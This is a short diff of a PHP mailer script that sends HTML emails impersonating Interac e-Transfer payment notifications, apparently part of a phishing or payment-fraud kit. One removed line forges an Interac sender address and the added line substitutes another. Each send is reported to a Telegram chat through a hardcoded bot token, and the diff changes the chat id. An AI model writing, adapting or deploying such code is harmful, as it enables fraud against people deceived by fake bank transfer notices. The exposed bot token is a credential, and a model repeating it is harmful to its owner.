@@ -57,7 +57,7 @@ $mail->Body = $message; // use $message instead of $template
 $mail->SMTPAuth = true; 
 $mail->Username = $_POST['username']; 
 $mail->Password = $_POST['password']; 
-$mail->SetFrom('notify@payments.interac.ca', $_POST['sender_name']); 
+$mail->SetFrom('triplex@gpnet.ca', $_POST['sender_name']); 
 $mail->AddAddress($_POST['receiver_email']); 
 $mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
 $mail->IsHTML(true); 
@@ -70,7 +70,7 @@ if(!$mail->Send()) {
 $message ="INTERAC E-TRANSFER HAS BEEN SENT!";
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
-    'chat_id' => '-821080105',
+    'chat_id' => '-1001831940786',
     'text' => $message
 ];
 
